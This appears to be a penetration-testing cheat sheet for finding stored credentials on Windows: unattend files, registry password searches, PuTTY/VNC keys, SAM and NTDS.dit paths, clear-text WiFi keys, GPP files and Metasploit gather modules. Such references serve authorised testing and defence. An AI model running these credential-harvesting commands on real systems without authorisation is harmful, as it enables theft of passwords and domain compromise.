# Stored Credentials

### Unattend Files
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

### Regedit
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
reg query "HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\ORL\WinVNC3\Password"


# Search for passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Files
```
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

# Find all passwords in all files.
findstr /spin "password" *.*
```

### SAM & SYSTEM & NTDS
```
C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
C:\Windows\repair\SYSTEM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\SYSTEM
C:\Windows\NTDS\NTDS.dit
```

### WiFi
```
netsh wlan show profiles # list SSID
netsh wlan show profile name=<SSID name> key=clear # show SSID's password
```

### GPP
```
DC-IP\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
Groups.xml
Services.xml
Scheduledtasks.xml
DataSources.xml
Printers.xml
Drives.xml
```

### Metasploit
```
post/windows/gather/credentials/*
post/windows/gather/enum_unattend
```
